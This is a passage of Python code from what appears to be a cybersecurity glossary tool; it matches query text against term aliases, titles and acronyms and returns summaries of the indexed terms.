    for alias, canonical_key in TERM_ALIASES.items():
        pattern = r'\b' + re.escape(alias) + r'\b'
        if re.search(pattern, query_lower):
            matched_keys.add(canonical_key)
            
    # 2. Key search in titles and acronyms
    for key, data in CYBER_TERMS.items():
        if key in query_lower:
            matched_keys.add(key)
        elif data.get("title", "").lower() in query_lower:
            matched_keys.add(key)
        elif data.get("acronym", "").lower() in query_lower:
            matched_keys.add(key)

    results = []
    for key in matched_keys:
        if key in CYBER_TERMS:
            entry = dict(CYBER_TERMS[key])
            entry["key"] = key
            results.append(entry)
            
    return results

def get_all_terms_summary() -> List[Dict[str, str]]:
    """Return a list of all indexed cybersecurity terms with basic metadata."""
    summary = []
    for key, val in CYBER_TERMS.items():
        summary.append({
            "key": key,
            "title": val["title"],
            "category": val["category"],
            "acronym": val.get("acronym", key.upper()),
            "definition": val["definition"]
        })
    return summary
